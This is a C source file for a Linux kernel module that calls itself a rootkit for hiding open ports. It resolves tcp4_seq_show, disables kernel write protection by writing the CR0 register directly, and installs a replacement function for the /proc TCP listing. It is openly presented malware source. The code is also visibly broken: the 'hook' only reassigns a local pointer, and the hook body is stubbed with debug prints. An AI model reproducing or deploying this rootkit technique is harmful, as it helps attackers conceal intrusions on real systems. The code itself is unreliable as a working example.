#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/tcp.h>
#include <linux/proc_fs.h>
#include <net/tcp.h>

#define TMPSZ 150

MODULE_LICENSE("GPL");
MODULE_AUTHOR("TheXcellerator");
MODULE_DESCRIPTION("Hiding open ports");
MODULE_VERSION("0.01");

static unsigned long * __tcp4_seq_show;

/* We have to save a copy of the tcp4_seq_show function the same way we save syscalls */
typedef asmlinkage int (*orig_tcp4_seq_show_t)(struct net *);
orig_tcp4_seq_show_t orig_tcp4_seq_show;

/* This is our hook function for tcp4_seq_show */
asmlinkage int hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
	struct tcp_iter_state *st;
	struct sock *sk = v;

	seq_setwidth(seq, TMPSZ -1);
	if (v == SEQ_START_TOKEN) {
		seq_puts(seq, "  sl  local_address rem_address   st tx_queue "
				"rx_queue tr tm->when retrnsmt   uid  timeout "
				"inode");
		goto out;
	}
	st = seq->private;

	if (sk->sk_state == TCP_TIME_WAIT)
		//get_timewait4_sock(v, seq, st->num);
		printk(KERN_DEBUG "rootkit: sk->sk_state == TCP_TIME_WAIT\n");
	else if (sk->sk_state == TCP_NEW_SYN_RECV)
		//get_openreq4(v, seq, st->num);
		printk(KERN_DEBUG "rootkit: sk->sk_state == TCP_NEW_SYN_RECV\n");
	else
		//get_tcp4_sock(v, seq, st->num);
		printk(KERN_DEBUG "rootkit: else\n");

out:
	seq_pad(seq, '\n');
	return 0;
}

/* The built in linux write_cr0() function stops us from modifying
 * the WP bit, so we write our own instead */
inline void cr0_write(unsigned long cr0)
{
	asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}

/* Bit 16 in the cr0 register is the W(rite) P(rotection) bit which
 * determines whether read-only pages can be written to. We are modifying
 * the syscall table, so we need to unset it first */
static inline void protect_memory(void)
{
	unsigned long cr0 = read_cr0();
	set_bit(16, &cr0);
	cr0_write(cr0);
}

static inline void unprotect_memory(void)
{
	unsigned long cr0 = read_cr0();
	clear_bit(16, &cr0);
	cr0_write(cr0);
}

/* Module initialization function */
static int __init rootkit_init(void)
{
	/* Lookup the memory location of tcp4_seq_show and set
	 * the orig_ function to it */
	__tcp4_seq_show = kallsyms_lookup_name("tcp4_seq_show");
	orig_tcp4_seq_show = (orig_tcp4_seq_show_t) __tcp4_seq_show;

	printk(KERN_INFO "rootkit: Loaded >:-)\n");
	printk(KERN_INFO "rootkit: found tcp4_seq_show at 0x%lx\n", __tcp4_seq_show);

	unprotect_memory();

	/* Set __tcp4_seq_show to our hook */
	printk(KERN_DEBUG "rootkit: hooking tcp4_seq_show... (0x%lx)\n", hook_tcp4_seq_show);
	__tcp4_seq_show = (unsigned long)hook_tcp4_seq_show;

	protect_memory();

	return 0;
}

static void __exit rootkit_exit(void)
{
	unprotect_memory();
	
	/* Set __tcp4_seq_show back to the saved original function */
	printk(KERN_DEBUG "rootkit: restoring tcp4_seq_show... (0x%lx)\n", orig_tcp4_seq_show);
	__tcp4_seq_show = (unsigned long)orig_tcp4_seq_show;

	protect_memory();
	
	printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
